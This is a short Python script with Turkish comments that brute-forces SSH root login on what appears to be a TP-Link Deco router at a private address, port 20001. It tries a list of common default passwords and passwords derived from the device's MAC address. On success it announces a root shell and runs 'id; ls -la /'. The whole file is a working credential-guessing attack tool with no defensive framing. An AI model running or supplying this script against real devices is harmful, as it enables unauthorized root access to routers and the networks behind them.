import paramiko
import time

# models.json'dan alınan bilgileri kullan
# (Eğer models.json erişilebilirse oradan MAC adresini al)

def try_ssh_login(host, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password, timeout=5, allow_agent=False, look_for_keys=False)
        print(f"[+] BAŞARILI: {username}:{password}")
        return client
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        print(f"[-] Hata: {e}")
        return None

TARGET = "192.168.68.1"
PORT = 20001

# Potansiyel şifre listesi
passwords = [
    "",  # Boş şifre
    "admin",
    "password",
    "tplink",
    "root",
    "12345678",
    "admin123",
    "tplink2020",
    "deco",
    "owner",
]

# MAC adresi varyasyonları (eğer biliniyorsa)
mac = "AABBCCDDEEFF"  # Gerçek MAC ile değiştir
mac_variants = [
    mac.lower(),
    mac.upper(),
    mac[-6:].lower(),
    mac[-6:].upper(),
    mac.replace(":", ""),
    f"admin{mac[-6:]}",
    f"tplink{mac[-4:]}",
]

passwords.extend(mac_variants)

print("[*] SSH Brute Force başlatılıyor...")
for pwd in passwords:
    print(f"[*] Deneniyor: root:{pwd}")
    client = try_ssh_login(TARGET, PORT, "root", pwd)
    if client:
        print(f"[+] ROOT SHELL ELDE EDİLDİ!")
        stdin, stdout, stderr = client.exec_command("id; ls -la /")
        print(stdout.read().decode())
        client.close()
        break
    time.sleep(0.5)